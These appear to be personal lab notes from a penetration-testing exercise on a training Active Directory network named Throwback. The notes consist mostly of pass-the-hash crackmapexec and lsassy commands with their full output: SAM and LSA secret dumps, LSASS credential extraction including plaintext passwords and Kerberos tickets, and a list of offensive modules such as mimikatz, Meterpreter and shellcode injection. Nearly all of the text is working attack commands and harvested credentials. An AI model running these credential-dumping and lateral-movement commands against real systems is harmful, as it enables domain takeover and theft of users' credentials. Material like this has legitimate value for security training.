1. Enumerating Users
```
proxychains crackmapexec smb 10.200.34.219 -u 'Administrator' -H 'a06e58d15a2585235d18598788b8147a' --users

SMB         10.200.34.219   445    THROWBACK-PROD   [+] Enumerated domain user(s)
SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK.local\admin-petersj                  Local admin account for Jon
SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK.local\Administrator                  Built-in account for administering the computer/domain
SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK.local\DefaultAccount                 A user account managed by the system.
SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK.local\Guest                          Built-in account for guest access to the computer/domain
SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK.local\sshd                           
SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK.local\WDAGUtilityAccount             A user account managed and used by the system for Windows Defender Application Guard scenarios.
```

2. Enumerating Groups
```
Not found/Unable to do it
```

3. Enumerating Shares
```
proxychains crackmapexec smb 10.200.34.219 -u 'Administrator' -H 'a06e58d15a2585235d18598788b8147a' --shares

SMB         10.200.34.219   445    THROWBACK-PROD   [+] Enumerated shares
SMB         10.200.34.219   445    THROWBACK-PROD   Share           Permissions     Remark
SMB         10.200.34.219   445    THROWBACK-PROD   -----           -----------     ------
SMB         10.200.34.219   445    THROWBACK-PROD   ADMIN$          READ,WRITE      Remote Admin
SMB         10.200.34.219   445    THROWBACK-PROD   C$              READ,WRITE      Default share
SMB         10.200.34.219   445    THROWBACK-PROD   IPC$            READ            Remote IPC
SMB         10.200.34.219   445    THROWBACK-PROD   Users           READ,WRITE      
```

4. Dumping SAM hashes
```
proxychains crackmapexec smb 10.200.34.219 -u 'Administrator' -H 'a06e58d15a2585235d18598788b8147a' --sam

SMB         10.200.34.219   445    THROWBACK-PROD   [+] Dumping SAM hashes

SMB         10.200.34.219   445    THROWBACK-PROD   Administrator:500:aad3b435b51404eeaad3b435b51404ee:a06e58d15a2585235d18598788b8147a:::

SMB         10.200.34.219   445    THROWBACK-PROD   Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SMB         10.200.34.219   445    THROWBACK-PROD   DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SMB         10.200.34.219   445    THROWBACK-PROD   WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::

SMB         10.200.34.219   445    THROWBACK-PROD   sshd:1009:aad3b435b51404eeaad3b435b51404ee:fe2acb5ea93988befc849a6981e0526a:::

SMB         10.200.34.219   445    THROWBACK-PROD   admin-petersj:1010:aad3b435b51404eeaad3b435b51404ee:74fb0a2ee8a066b1e372475dcbc121c5:::

```

5. Dumping LSA secrets
```
proxychains crackmapexec smb 10.200.34.219 -u 'Administrator' -H 'a06e58d15a2585235d18598788b8147a' --lsa

SMB         10.200.34.219   445    THROWBACK-PROD   [+] Dumping LSA secrets

SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK.LOCAL/Administrator:$DCC2$10240#Administrator#94b4b0be8963853c02b3c81fefd3a458

SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK.LOCAL/WEBService:$DCC2$10240#WEBService#4f10bc32bc69e5b950113494fddfaa39

SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK.LOCAL/spooks:$DCC2$10240#spooks#6bdfcca7cc64eaa531a5bf146388b020

SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK.LOCAL/PetersJ:$DCC2$10240#PetersJ#c89815e19988e5d91f20ad66acaa77ac

SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK.LOCAL/BlaireJ:$DCC2$10240#BlaireJ#e84cb4c5d143be7158bd6628e89a2cf3

SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK\THROWBACK-PROD$:aes256-cts-hmac-sha1-96:2316a23add1e45ac2bb3bcf30330ded58d73cc4627a1096823d5080c0671cdb4

SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK\THROWBACK-PROD$:aes128-cts-hmac-sha1-96:1b37a36a74ceee1b8797e86ecadde3b0

SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK\THROWBACK-PROD$:des-cbc-md5:1fc4fec7ab9d2f16

SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK\THROWBACK-PROD$:plain_password_hex:63e1576036b81e0813bbcbb2b106c58703c79c4bd81e2a60c2ef9dbd0b38d1827905b29f9d7389fc160569bc4ec63b23f7bf2bc1058dc9414325f16cb6266ee367fead794bf3205652a83e2aa4bc3c0e447096e5020f946bd0f5932be4e27a8a97c00288cb66346ff854d996f42d49061ed30eff3e381a424704d830213f47a100aaa42db2be55bbf4023cd5ae4c3265be6cd723fcb785b3df7d06628ba9f6dae84fa67e1674db6758f31f85d97ef59eb91b1159d0f1a2811369b7e3c10d0267ada28851cbec6a2fb290c59606098c79fe79461a9a491ea3a5648d4f475e55870c87c4425335633ccd815b6d3f338e79                                                                                                                                

SMB         10.200.34.219   445    THROWBACK-PROD   THROWBACK\THROWBACK-PROD$:aad3b435b51404eeaad3b435b51404ee:fbd5e3af4ec1d8b1c8a4303795fbe8e8:::

SMB         10.200.34.219   445    THROWBACK-PROD   dpapi_machinekey:0x6ec76b4abb51d3b2112cd9d388159f9b1f48fcdc
dpapi_userkey:0x08dfdae23d83f9d59fdcb12b004fc943a0463974                                                                                                                                                                                   

SMB         10.200.34.219   445    THROWBACK-PROD   NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2

SMB         10.200.34.219   445    THROWBACK-PROD   [+] Dumped 12 LSA secrets to /root/.cme/logs/THROWBACK-PROD_10.200.34.219_2022-10-14_231001.secrets and /root/.cme/logs/THROWBACK-PROD_10.200.34.219_2022-10-14_231001.cached

```

6. Modules of #Crackmapexec 

[*] Get-ComputerDetails       Enumerates sysinfo
[*] bh_owned                  Set pwned computer as owned in Bloodhound
[*] bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers' machine
[*] drop-sc                   Drop a searchConnector-ms file on each writable share
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] get_keystrokes            Logs keys pressed, time and the active window
[*] get_netdomaincontroller   Enumerates all domain controllers
[*] get_netrdpsession         Enumerates all active RDP sessions
[*] get_timedscreenshot       Takes screenshots at a regular interval
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] handlekatz                Get lsass dump using handlekatz64 and parse the result with pypykatz
[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
[*] invoke_vnc                Injects a VNC client in memory
[*] ioxidresolver             Thie module helps you to identify hosts that have additional active interfaces
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] mimikatz                  Dumps all logon credentials from memory
[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
[*] mimikittenz               Executes Mimikittenz
[*] ms17-010                  MS17-010, /!\ not tested oustide home lab
[*] multirdp                  Patches terminal services in memory to allow multiple RDP users
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] netripper                 Capture's credentials by using API hooking
[*] nopac                     Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
[*] petitpotam                Module to check if the DC is vulnerable to PetitPotam, credit to @topotam
[*] procdump                  Get lsass dump using procdump64 and parse the result with pypykatz
[*] rdp                       Enables/Disables RDP
[*] rid_hijack                Executes the RID hijacking persistence hook.
[*] runasppl                  Check if the registry value RunAsPPL is set or not
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] spider_plus               List files on the target server (excluding `DIR` directories and `EXT` extensions) and save them to the `OUTPUT` directory if they are smaller then `SIZE`
[*] spooler                   Detect if print spooler is enabled or not
[*] test_connection           Pings a host
[*] tokens                    Enumerates available tokens
[*] uac                       Checks UAC status
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
[*] webdav                    Checks whether the WebClient service is running on the target
[*] wireless                  Get key of all wireless interfaces
[*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472

7. Dumping LSASS
```
proxychains lsassy -d THROWBACK.local -u Administrator -H a06e58d15a2585235d18598788b8147a 10.200.34.219

[+] 10.200.34.219 THROWBACK\BlaireJ                                          [NT] c374ecb7c2ccac1df3a82bce4f80bb5b | [SHA1] 6522277853426f24275c4c0b0381458ef452e640

[+] 10.200.34.219 THROWBACK.LOCAL\BlaireJ                                    [PWD] 7eQgx6YzxgG3vC45t5k9

[+] 10.200.34.219 THROWBACK\THROWBACK-PROD$                                  [NT] fbd5e3af4ec1d8b1c8a4303795fbe8e8 | [SHA1] f3455e303d91645c64fe9a5a1ab02e0038f82acc

[+] 10.200.34.219 THROWBACK.local\THROWBACK-PROD$                            [PWD] 63e1576036b81e0813bbcbb2b106c58703c79c4bd81e2a60c2ef9dbd0b38d1827905b29f9d7389fc160569bc4ec63b23f7bf2bc1058dc9414325f16cb6266ee367fead794bf3205652a83e2aa4bc3c0e447096e5020f946bd0f5932be4e27a8a97c00288cb66346ff854d996f42d49061ed30eff3e381a424704d830213f47a100aaa42db2be55bbf4023cd5ae4c3265be6cd723fcb785b3df7d06628ba9f6dae84fa67e1674db6758f31f85d97ef59eb91b1159d0f1a2811369b7e3c10d0267ada28851cbec6a2fb290c59606098c79fe79461a9a491ea3a5648d4f475e55870c87c4425335633ccd815b6d3f338e79                                                                                                                                              

[+] 10.200.34.219 THROWBACK-PROD\admin-petersj                               [NT] 74fb0a2ee8a066b1e372475dcbc121c5 | [SHA1] ae40d7644fc099822b85ce01185468a35b5a16b1

[+] 10.200.34.219 THROWBACK-PROD\Administrator                               [NT] a06e58d15a2585235d18598788b8147a | [SHA1] 4e40938facb10fb6aa244240301b791a0454f328

[+] 10.200.34.219 THROWBACK-PROD\admin-petersj                               [PWD] SinonFTW123!

[+] 10.200.34.219 Login\admin-petersj                                        [PWD] SinonFTW123!

[+] 10.200.34.219 THROWBACK-PROD\admin-petersj\THROWBACK-PROD\admin-petersj  [PWD] SinonFTW123!

[+] 10.200.34.219 THROWBACK.LOCAL\THROWBACK-PROD$                            [TGT] Domain: THROWBACK.LOCAL - End time: 2022-10-15 12:27 (TGT_THROWBACK.LOCAL_THROWBACK-PROD$_krbtgt_THROWBACK.LOCAL_86a3619a.kirbi)

[+] 10.200.34.219 THROWBACK.LOCAL\THROWBACK-PROD$                            [TGT] Domain: THROWBACK.LOCAL - End time: 2022-10-15 12:27 (TGT_THROWBACK.LOCAL_THROWBACK-PROD$_krbtgt_THROWBACK.LOCAL_64b6699d.kirbi)

[+] 10.200.34.219 THROWBACK.LOCAL\THROWBACK-PROD$                            [TGT] Domain: THROWBACK.LOCAL - End time: 2022-10-15 12:28 (TGT_THROWBACK.LOCAL_THROWBACK-PROD$_krbtgt_THROWBACK.LOCAL_f4dce6f0.kirbi)

[+] 10.200.34.219 THROWBACK.LOCAL\THROWBACK-PROD$                            [TGT] Domain: THROWBACK.LOCAL - End time: 2022-10-15 12:28 (TGT_THROWBACK.LOCAL_THROWBACK-PROD$_krbtgt_THROWBACK.LOCAL_101f080d.kirbi)

```

